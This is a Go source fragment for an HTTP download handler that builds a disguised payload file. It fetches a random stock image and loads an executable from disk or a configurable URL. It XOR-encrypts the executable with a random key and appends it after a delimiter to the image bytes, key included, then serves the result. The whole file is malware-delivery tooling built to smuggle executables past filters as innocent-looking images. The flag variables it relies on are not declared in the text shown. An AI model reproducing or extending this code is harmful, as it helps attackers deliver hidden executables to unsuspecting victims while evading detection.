package main

import (
	"bytes"
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
)

func sendCombinedFile(w io.Writer) error {
	imageURL := "https://picsum.photos/1920/1080"
	imageResp, err := http.Get(imageURL)
	if err != nil {
		return err
	}
	defer imageResp.Body.Close()

	if imageResp.StatusCode != http.StatusOK {
		return fmt.Errorf("failed to download image, status code: %d", imageResp.StatusCode)
	}

	var exeData []byte
	if *useURL {
		exeResp, err := http.Get(*exeSource)
		if err != nil {
			return err
		}
		defer exeResp.Body.Close()

		if exeResp.StatusCode != http.StatusOK {
			return fmt.Errorf("failed to download executable, status code: %d", exeResp.StatusCode)
		}
		exeData, err = io.ReadAll(exeResp.Body)
		if err != nil {
			return err
		}
	} else {
		exeData, err = os.ReadFile(*exeSource)
		if err != nil {
			return fmt.Errorf("failed to read executable from local path: %v", err)
		}
	}

	key := make([]byte, 16)
	_, err = rand.Read(key)
	if err != nil {
		return fmt.Errorf("failed to generate random key: %v", err)
	}

	for i := range exeData {
		exeData[i] ^= key[i%len(key)]
	}

	log.Printf("Using XOR key: %x\n", key)

	buffer := new(bytes.Buffer)

	if _, err = io.Copy(buffer, imageResp.Body); err != nil {
		return err
	}

	delimiter := []byte{0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}
	if _, err = buffer.Write(delimiter); err != nil {
		return err
	}

	if _, err = buffer.Write(exeData); err != nil {
		return err
	}

	if _, err = buffer.Write(key); err != nil {
		return err
	}

	hash := sha256.Sum256(buffer.Bytes())
	log.Printf("SHA-256 hash of the Payload file: %s\n", hex.EncodeToString(hash[:]))

	if _, err = io.Copy(w, buffer); err != nil {
		return err
	}

	return nil
}

func downloadHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != "GET" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if err := sendCombinedFile(w); err != nil {
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		log.Printf("Failed to generate or send the file: %v", err)
	}
}
